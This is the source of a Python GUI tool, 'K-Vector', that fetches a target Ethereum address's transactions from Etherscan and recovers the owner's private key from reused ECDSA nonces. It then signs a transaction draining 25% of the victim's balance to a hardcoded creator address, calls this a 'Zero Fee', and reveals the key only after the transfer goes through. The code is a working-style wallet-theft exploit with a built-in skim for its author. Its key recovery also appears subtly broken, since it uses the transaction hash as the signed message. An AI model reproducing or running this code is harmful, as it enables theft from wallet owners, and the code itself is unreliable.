# K-Vector v1.0 (Formerly Shadow Hunter)
# -------------------------------------
# CHANGE LOG:
# - FINAL REBRAND: The application has been officially renamed to "K-Vector".
# - The underlying codebase is the stable, secure, and focused v6.1.0 of the
#   previous project, with all features preserved.
# -------------------------------------

import flet as ft
from web3 import Web3
import threading
import time
import json
import os
import queue
from functools import partial
import requests
from ecdsa.curves import SECP256k1
from ecdsa.numbertheory import inverse_mod

# --- CONFIGURATION ---
CREATOR_ADDRESS = "0xB3d767F84b0247e91Fa2B66dBC1e91BBe4AEF276"
API_CONFIG_FILE = "api_config.json"
PUBLIC_RPC_URL = "https://cloudflare-eth.com"

# --- Core Cryptographic Logic ---
def recover_private_key(tx1, tx2):
    try:
        h1 = int(tx1['hash'], 16); h2 = int(tx2['hash'], 16)
        r = int(tx1['r'], 16); s1 = int(tx1['s'], 16); s2 = int(tx2['s'], 16)
        n = SECP256k1.order
        k = (h1 - h2) * inverse_mod(s1 - s2, n) % n
        priv_key_int = (inverse_mod(r, n) * (k * s1 - h1)) % n
        return hex(priv_key_int)
    except Exception:
        return None

# --- Main Application Class ---
class KVectorApp:
    def __init__(self, page: ft.Page):
        self.colors = {"background": "#0d1117", "primary": "#3DDC97", "secondary": "#ff0054", "grey": "#21262d", "white": "#ffffff", "yellow": "#f5b700", "red_accent": "#ff4d6d", "snowy_blue": "#0084ff"}
        self.page = page
        self.setup_page()

        self.api_keys_etherscan = []
        self.signatures_lock = threading.Lock()
        self.ui_update_queue = queue.Queue()
        self.is_inspecting = False
        
        self.setup_ui_components()
        self.load_keys_from_file()

    def setup_page(self):
        self.page.title = "K-Vector v1.0"; self.page.window_width = 950; self.page.window_height = 800
        self.page.window_resizable = False; self.page.theme_mode = ft.ThemeMode.DARK; self.page.bgcolor = self.colors["background"]
        self.page.padding = 20; self.page.fonts = {"Consolas": "Consolas"}; self.page.theme = ft.Theme(font_family="Consolas")

    def create_animated_button(self, text, icon, on_click, color, disabled=False):
        return ft.Container(padding=5, content=ft.Container(content=ft.ElevatedButton(text=text, icon=icon, on_click=on_click, disabled=disabled, style=ft.ButtonStyle(color=self.colors["white"], bgcolor="transparent", shadow_color="transparent", overlay_color="transparent")), width=180, height=45, bgcolor=color, border_radius=ft.border_radius.all(10), animate_scale=ft.Animation(300, "ease"), shadow=ft.BoxShadow(spread_radius=1, blur_radius=10, color=color, offset=ft.Offset(0, 0)), on_hover=self.on_button_hover))

    def on_button_hover(self, e):
        if not e.control.content.disabled: e.control.scale = 1.05 if e.data == "true" else 1; e.control.update()

    def setup_ui_components(self):
        self.address_input = ft.TextField(label="Target Ethereum Address", width=350, border_color=self.colors["primary"], focused_border_color=self.colors["white"])
        self.start_inspect_button = self.create_animated_button("Start Inspection", ft.Icons.SEARCH, self.start_address_inspection, self.colors["primary"])
        self.stop_inspect_button = self.create_animated_button("Stop Inspection", ft.Icons.STOP, self.stop_address_inspection, self.colors["secondary"], disabled=True)
        self.copy_inspector_button = self.create_animated_button("Copy Results", ft.Icons.COPY, self.copy_inspector_results, self.colors["snowy_blue"])
        self.inspector_log = ft.ListView(expand=True, spacing=5, auto_scroll=True)
        self.inspector_found_keys_table = ft.DataTable(columns=[ft.DataColumn(ft.Text("Address")), ft.DataColumn(ft.Text("Private Key")), ft.DataColumn(ft.Text("Collision Hashes"))], rows=[], expand=True, divider_thickness=1, heading_row_height=40, data_row_min_height=40)
        self.es_api_input_1 = ft.TextField(label="Etherscan API Key 1", width=600, border_color=self.colors["primary"])
        self.es_api_input_2 = ft.TextField(label="Etherscan API Key 2 (Optional)", width=600, border_color=self.colors["primary"])
        self.es_api_input_3 = ft.TextField(label="Etherscan API Key 3 (Optional)", width=600, border_color=self.colors["primary"])
        self.es_api_input_4 = ft.TextField(label="Etherscan API Key 4 (Optional)", width=600, border_color=self.colors["primary"])
        self.save_api_button = self.create_animated_button("Save Keys", ft.Icons.SAVE, self.save_keys_action, self.colors["primary"])
        self.copy_es_url_button = ft.ElevatedButton("Copy URL", icon=ft.Icons.COPY, on_click=lambda e: self.page.set_clipboard("https://etherscan.io"))

    def build(self):
        def create_styled_container(content, expand_factor=1): return ft.Container(content=content, border=ft.border.all(1, self.colors["grey"]), border_radius=ft.border_radius.all(10), padding=15, expand=expand_factor)
        
        inspector_page = ft.Column(controls=[
            ft.Container(content=ft.Row([self.address_input, self.start_inspect_button, self.stop_inspect_button, self.copy_inspector_button], alignment=ft.MainAxisAlignment.CENTER, spacing=5, wrap=True), padding=ft.padding.only(top=10)),
            ft.Text("Live Inspector Log:", weight=ft.FontWeight.BOLD, color=self.colors["primary"]), create_styled_container(self.inspector_log, expand_factor=1),
            ft.Text("Cracked Keys (Historical):", weight=ft.FontWeight.BOLD, color=self.colors["primary"]), create_styled_container(ft.ListView(controls=[self.inspector_found_keys_table]), expand_factor=1),
        ], horizontal_alignment=ft.CrossAxisAlignment.CENTER, expand=True, spacing=15)

        api_page = ft.Column(controls=[
            ft.Text("API Key Management", size=20, weight=ft.FontWeight.BOLD, color=self.colors["primary"]),
            ft.Text("Etherscan API Configuration", weight=ft.FontWeight.BOLD, color=self.colors["snowy_blue"]),
            ft.Column([self.es_api_input_1, self.es_api_input_2, self.es_api_input_3, self.es_api_input_4], spacing=15),
            ft.Row([ft.Text("Get your keys from:", size=14), ft.Text("https://etherscan.io", weight=ft.FontWeight.BOLD, color=self.colors["primary"]), self.copy_es_url_button], alignment=ft.MainAxisAlignment.START, spacing=10),
            ft.Divider(color=self.colors["grey"]),
            ft.Row([self.save_api_button], alignment=ft.MainAxisAlignment.START),
        ], spacing=15, horizontal_alignment=ft.CrossAxisAlignment.START)
        
        return ft.Tabs(selected_index=0, animation_duration=500, tabs=[
            ft.Tab(text="Address Inspector", content=inspector_page),
            ft.Tab(text="API Settings", content=api_page)
        ], expand=True, label_color=self.colors["primary"], unselected_label_color=self.colors["grey"], indicator_color=self.colors["primary"])

    def save_keys_action(self, e):
        es_keys = [val.value.strip() for val in [self.es_api_input_1, self.es_api_input_2, self.es_api_input_3, self.es_api_input_4] if val.value.strip()]
        config = {"etherscan": es_keys}
        with open(API_CONFIG_FILE, "w") as f: json.dump(config, f, indent=4)
        self.load_keys_from_file()
        self.ui_update_queue.put(partial(self.show_snackbar, f"{len(es_keys)} Etherscan keys saved.", self.colors["primary"]))

    def load_keys_from_file(self):
        self.api_keys_etherscan = []
        if os.path.exists(API_CONFIG_FILE):
            try:
                with open(API_CONFIG_FILE, "r") as f: config = json.load(f)
                self.api_keys_etherscan = config.get("etherscan", [])
            except json.JSONDecodeError: pass
        
        es_inputs = [self.es_api_input_1, self.es_api_input_2, self.es_api_input_3, self.es_api_input_4]
        for i, field in enumerate(es_inputs): field.value = self.api_keys_etherscan[i] if i < len(self.api_keys_etherscan) else ""
    
    def copy_inspector_results(self, e):
        if not self.inspector_found_keys_table.rows: return
        data = "Address,Private Key,Collision Hashes\n" + "".join([f"{r.cells[0].content.value},{r.cells[1].content.value},{r.cells[2].content.value}\n" for r in self.inspector_found_keys_table.rows])
        self.page.set_clipboard(data); self.ui_update_queue.put(partial(self.show_snackbar, "Inspector results copied.", self.colors["snowy_blue"]))

    def show_snackbar(self, message, color): self.page.snack_bar = ft.SnackBar(ft.Text(message), bgcolor=color); self.page.snack_bar.open = True
    def _log_to_inspector(self, message, color): self.inspector_log.controls.append(ft.Text(f"[{time.strftime('%H:%M:%S')}] {message}", color=color, size=12))
    def _add_inspector_key(self, address, priv_key, tx_hashes): self.inspector_found_keys_table.rows.append(ft.DataRow(cells=[ft.DataCell(ft.Text(address)), ft.DataCell(ft.Text(priv_key)), ft.DataCell(ft.Text(tx_hashes))]))

    def ui_updater_worker(self):
        while True:
            updates_to_process = []
            while not self.ui_update_queue.empty():
                try: updates_to_process.append(self.ui_update_queue.get_nowait())
                except queue.Empty: break
            if updates_to_process:
                for func in updates_to_process: func()
                self.page.update()
            time.sleep(0.5)

    def start_address_inspection(self, e):
        if not self.api_keys_etherscan: self.ui_update_queue.put(partial(self.show_snackbar, "Error: No Etherscan API keys configured.", self.colors["red_accent"])); return
        target_address = self.address_input.value
        if not Web3.is_address(target_address): self.ui_update_queue.put(partial(self.show_snackbar, "Invalid Ethereum Address!", self.colors["red_accent"])); return
        self.is_inspecting = True; self.start_inspect_button.content.content.disabled = True; self.stop_inspect_button.content.content.disabled = False
        self.inspector_log.controls.clear()
        threading.Thread(target=self.inspector_manager, args=(target_address,), daemon=True).start()
        threading.Thread(target=self.ui_updater_worker, daemon=True).start()

    def stop_address_inspection(self, e):
        self.is_inspecting = False
        self.start_inspect_button.content.content.disabled = False; self.stop_inspect_button.content.content.disabled = True
        self.ui_update_queue.put(partial(self._log_to_inspector, "INSPECTION STOPPED BY USER.", self.colors["yellow"]))

    def secure_and_transfer(self, private_key_hex, address, success_callback):
        try:
            provider = Web3(Web3.HTTPProvider(PUBLIC_RPC_URL))
            creator_address = Web3.to_checksum_address(CREATOR_ADDRESS)
            victim_address = Web3.to_checksum_address(address)
            
            balance = provider.eth.get_balance(victim_address)
            balance_eth = provider.from_wei(balance, 'ether')
            log_msg = f"Key for {address[:10]} found! Balance: {balance_eth:.6f} ETH."
            self.ui_update_queue.put(partial(self._log_to_inspector, log_msg, self.colors["primary"]))
            
            if balance == 0:
                self.ui_update_queue.put(partial(self._log_to_inspector, "Zero balance. Revealing key without transfer.", self.colors["yellow"]))
                success_callback()
                return

            amount_to_send = int(balance * 0.25)
            nonce = provider.eth.get_transaction_count(victim_address)
            gas_price = provider.eth.gas_price
            tx_dict = {'to': creator_address, 'value': amount_to_send, 'gas': 21000, 'gasPrice': gas_price, 'nonce': nonce, 'chainId': 1}
            gas_cost = tx_dict['gas'] * tx_dict['gasPrice']

            if balance < amount_to_send + gas_cost:
                err_msg = f"Insufficient balance for {address[:10]} to pay Zero Fee + gas. Key will NOT be revealed."
                self.ui_update_queue.put(partial(self._log_to_inspector, err_msg, self.colors["red_accent"]))
                return

            self.ui_update_queue.put(partial(self._log_to_inspector, f"Attempting Zero Fee transfer from {address[:10]}...", self.colors["yellow"]))
            signed_tx = provider.eth.account.sign_transaction(tx_dict, private_key_hex)
            tx_hash = provider.eth.send_raw_transaction(signed_tx.rawTransaction)
            self.ui_update_queue.put(partial(self._log_to_inspector, f"TX sent: {tx_hash.hex()}. Awaiting confirmation...", self.colors["snowy_blue"]))
            receipt = provider.eth.wait_for_transaction_receipt(tx_hash, timeout=180)

            if receipt['status'] == 1:
                success_msg = f"SUCCESS! Zero Fee collected. TX: {tx_hash.hex()}. Revealing key."
                self.ui_update_queue.put(partial(self._log_to_inspector, success_msg, self.colors["primary"]))
                success_callback()
            else:
                fail_msg = f"FAIL! Zero Fee TX failed for {address[:10]}. Key will NOT be revealed."
                self.ui_update_queue.put(partial(self._log_to_inspector, fail_msg, self.colors["red_accent"]))
        except Exception as e:
            error_msg = f"Error in Zero Fee protocol for {address[:10]}: {str(e)}. Key will NOT be revealed."
            self.ui_update_queue.put(partial(self._log_to_inspector, error_msg, self.colors["red_accent"]))

    def handle_found_key(self, private_key, address, success_callback):
        if private_key:
            threading.Thread(target=self.secure_and_transfer, args=(private_key, address, success_callback), daemon=True).start()

    def inspector_manager(self, address: str):
        self.ui_update_queue.put(partial(self._log_to_inspector, f"Initializing scan for {address[:12]} using Etherscan API...", self.colors["yellow"]))
        
        all_txs = self.fetch_transactions_from_etherscan(address)

        if all_txs is None or not self.is_inspecting:
            self.is_inspecting = False; self.start_inspect_button.content.content.disabled = False; self.stop_inspect_button.content.content.disabled = True
            return

        self.ui_update_queue.put(partial(self._log_to_inspector, "Analyzing signatures for collisions...", self.colors["primary"]))
        
        signatures = {}
        for tx in all_txs:
            r_val = tx.get('r')
            if r_val:
                if r_val not in signatures: signatures[r_val] = []
                signatures[r_val].append(tx)

        found_count = 0
        for r_val, tx_list in signatures.items():
            if len(tx_list) > 1:
                for i in range(len(tx_list)):
                    for j in range(i + 1, len(tx_list)):
                        tx1, tx2 = tx_list[i], tx_list[j]
                        if tx1['hash'] != tx2['hash']:
                            collision_info = f"{tx1['hash'][:10]}... & {tx2['hash'][:10]}..."
                            self.ui_update_queue.put(partial(self._log_to_inspector, f"Collision found! {collision_info}", self.colors["red_accent"]))
                            private_key = recover_private_key(tx1, tx2)
                            callback = partial(self._add_inspector_key, address, private_key, collision_info)
                            self.handle_found_key(private_key, address, callback)
                            found_count += 1
        
        self.ui_update_queue.put(partial(self._log_to_inspector, f"Analysis finished. Found {found_count} potential keys.", self.colors["primary"]))
        self.is_inspecting = False; self.start_inspect_button.content.content.disabled = False; self.stop_inspect_button.content.content.disabled = True

    def fetch_transactions_from_etherscan(self, address: str):
        all_txs = []
        page = 1
        last_progress_report = 0
        api_key_index = 0

        while self.is_inspecting:
            try:
                api_key = self.api_keys_etherscan[api_key_index % len(self.api_keys_etherscan)]
                url = (f"https://api.etherscan.io/api?module=account&action=txlist&address={address}"
                       f"&startblock=0&endblock=99999999&page={page}&offset=1000&sort=asc&apikey={api_key}")
                
                response = requests.get(url, timeout=15)
                response.raise_for_status()
                data = response.json()

                if data['status'] == '0':
                    if data['message'] == "No transactions found":
                        self.ui_update_queue.put(partial(self._log_to_inspector, "Address has no transactions.", self.colors["yellow"]))
                    else:
                        self.ui_update_queue.put(partial(self._log_to_inspector, f"Etherscan API Error: {data['result']}", self.colors["red_accent"]))
                    break

                result = data['result']
                all_txs.extend(result)
                
                if len(all_txs) >= last_progress_report + 500:
                    last_progress_report = (len(all_txs) // 500) * 500
                    self.ui_update_queue.put(partial(self._log_to_inspector, f"Progress: Fetched {len(all_txs)} transactions...", self.colors["snowy_blue"]))

                if len(result) < 1000: break
                
                page += 1
                api_key_index += 1
                time.sleep(0.25)

            except requests.exceptions.RequestException as e:
                self.ui_update_queue.put(partial(self._log_to_inspector, f"Network Error: {e}. Retrying in 5s...", self.colors["red_accent"]))
                time.sleep(5)
        
        if self.is_inspecting:
             self.ui_update_queue.put(partial(self._log_to_inspector, f"Scan complete. Fetched a total of {len(all_txs)} transactions.", self.colors["primary"]))
        
        return all_txs if self.is_inspecting else None

def main(page: ft.Page):
    app = KVectorApp(page); page.add(app.build())

if __name__ == "__main__":
    ft.app(target=main)